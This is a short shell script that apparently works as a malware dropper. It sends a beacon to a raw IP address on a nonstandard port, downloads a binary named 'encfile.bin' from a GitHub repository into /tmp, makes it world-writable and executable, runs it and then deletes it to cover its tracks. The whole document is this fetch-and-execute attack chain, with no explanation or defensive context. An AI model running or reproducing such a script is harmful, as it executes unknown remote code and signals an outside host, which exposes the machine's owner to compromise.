#!/bin/sh
curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
curl -o /tmp/run2.bin https://raw.githubusercontent.com/gptloveyou/learn/main/encfile.bin
chmod 777 /tmp/run2.bin
/tmp/run2.bin
rm /tmp/run2.bin
